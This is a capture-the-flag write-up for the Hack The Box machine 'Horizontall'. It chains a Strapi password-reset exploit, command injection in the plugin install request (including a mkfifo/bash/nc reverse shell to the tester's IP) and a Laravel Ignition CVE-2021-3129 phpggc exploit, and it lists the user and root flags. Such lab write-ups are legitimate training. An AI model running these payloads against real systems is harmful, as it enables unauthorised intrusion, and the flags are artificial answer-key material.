
# Horizontall

1. Find the hidden api inside the code */js/app.c68eb462.js*
````js
methods:{getReviews:function(){var t=this;r.a.get("http://api-prod.horizontall.htb/reviews").then((function(s){return t.reviews=s.data}))}}
````

2. Gobuster it reveals and Strapi admin painel
````bash
$ gobuster dir -x php,txt,html,bak,zip -e -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api-prod.horizontall.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,bak,zip,php,txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2022/01/08 18:16:46 Starting gobuster in directory enumeration mode
===============================================================
http://api-prod.horizontall.htb/index.html           (Status: 200) [Size: 413]
http://api-prod.horizontall.htb/reviews              (Status: 200) [Size: 507]
http://api-prod.horizontall.htb/admin                (Status: 200) [Size: 854]
http://api-prod.horizontall.htb/Reviews              (Status: 200) [Size: 507]
http://api-prod.horizontall.htb/robots.txt           (Status: 200) [Size: 121]
http://api-prod.horizontall.htb/Admin                (Status: 200) [Size: 854]
http://api-prod.horizontall.htb/REVIEWS              (Status: 200) [Size: 507]
                                                                  
===============================================================
2022/01/08 18:54:08 Finished
===============================================================
````

3. Looking for exploits shows us 3
````bash
# searchsploit strapi
-------------------------------- ---------------------------------
 Exploit Title                  |  Path
-------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Passwor | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Re | multiple/webapps/50239.py
-------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
````

4. Use exploit 50239 to generate the JWT
````
# python3 50239.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxNzQ2NTY4LCJleHAiOjE2NDQzMzg1Njh9.VBF90Lw2Hw0Jky2n2H0x5SUsV47DAoxw5HtjbJE3-Gk


$>
````

5. Uses the JWT to test the vulnerability through HTTP request

````
# tcpdump -i tun0 icmp
````

````http
POST /admin/plugins/install HTTP/1.1
Host: api-prod.horizontall.htb
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Connection: close
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxNjg1Mzg2LCJleHAiOjE2NDQyNzczODZ9.hC7xIJQQyHmfa3qOc2AmnyCTOkhgJcmZx1-_sERq_n4
Content-Length: 69

{
  "plugin":"documentation && $(ping 10.10.14.26)",
  "port":"1337"
}
````

````
# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
09:01:14.799327 IP horizontall.htb > 10.10.14.26: ICMP echo request, id 8657, seq 1, length 64
09:01:14.799373 IP 10.10.14.26 > horizontall.htb: ICMP echo reply, id 8657, seq 1, length 64
````

6. Creates a reverse shell tunnel

````shell
$ nc -lnvp 53
````

````http
POST /admin/plugins/install HTTP/1.1
Host: api-prod.horizontall.htb
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Connection: close
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxNjg1Mzg2LCJleHAiOjE2NDQyNzczODZ9.hC7xIJQQyHmfa3qOc2AmnyCTOkhgJcmZx1-_sERq_n4
Content-Length: 135

{
  "plugin":"documentation && $(mkfifo backpipe; /bin/bash < backpipe | nc 10.10.14.26 53 > backpipe ; rm backpipe)",
  "port":"1337"
}
````

7. User hash is on /home/developer/user.txt

````bash
strapi@horizontall:~/myapi$ uname -a
Linux horizontall 4.15.0-154-generic #161-Ubuntu SMP Fri Jul 30 13:04:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
````
8. Add your public key to /opt/strapi/.ssh/authorized_keys 

9. Log into the remote server creating a tunnel to access the port 8000 
````
$ ssh -i .ssh/htb -L8000:127.0.0.1:8000 strapi@horizontall.htb
````

10. Discover the vulnerability and exploit it
````
# php -d'phar.readonly=0' ./phpggc/phpggc --phar phar -f -o /tmp/exploit.phar monolog/rce1 system 'cat /root/root.txt'
# python3 lavarel.py http://127.0.0.1:8000/ /tmp/exploit.phar+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
19d41c672afa375a77332a90e87d5eb2
--------------------------
+ Logs cleared
````

[Exploit CVE-2021-3129](https://github.com/ambionics/laravel-exploits/blob/main/laravel-ignition-rce.py)
  
# Secrets
* FLAG_USER = edb3997bc0e86f32c6c9f363dddeee33
* FLAG_ROOT = 19d41c672afa375a77332a90e87d5eb2
